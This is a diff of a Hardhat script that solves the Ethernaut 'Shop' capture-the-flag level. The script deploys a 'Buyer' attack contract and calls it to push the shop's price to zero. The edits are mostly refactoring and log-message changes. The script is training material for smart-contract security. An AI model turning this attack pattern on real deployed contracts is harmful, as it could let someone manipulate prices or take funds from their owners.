@@ -19,11 +19,9 @@ const attackShop = async () => {
     // const deployed = await deployContract(hre, "Buyer", args);
     // alternative below
     console.log("Deploying attack contract Buyer...");
-    const Factory = await ethers.getContractFactory("Buyer", deployer);
-    const buyer = await Factory.deploy();
+    const buyer = await (await ethers.getContractFactory("Buyer", deployer)).deploy();
     console.log(buyer);
-    console.log(`Contract deployed to ${buyer.address}`);
-    console.log("Attack contract deployed...");
+    console.log(`Attack contract deployed to ${buyer.address}`);
     // experimantal verify below
     // if (buyer.address){
     //     console.log("Verifying contract...");
@@ -49,7 +47,7 @@ const attackShop = async () => {
     let price = (await contract.price()).toString();
     console.log(`Current price is: ${price}`);
     console.log("Attacking with malisciuos contract...");
-    const attack = await ethers.getContractAt("Buyer", attackShopBuyerAddress);
+    const attack = await ethers.getContractAt("Buyer", attackShopBuyerAddress); //buyer
     const tx = await attack.buyFromShop(_shopAddr);
     const txReceipt = tx.wait(1);
     console.log(txReceipt);
@@ -57,7 +55,7 @@ const attackShop = async () => {
     price = (await contract.price()).toString();
     console.log(`Price is now: ${price}`);
     if (price === "0") {
-        console.log("Level passed, Submit to ethernaut");
+        console.log("Congrats! Level passed, Submit to ethernaut");
     } else {
         console.log("Please review code above and try again");
     }
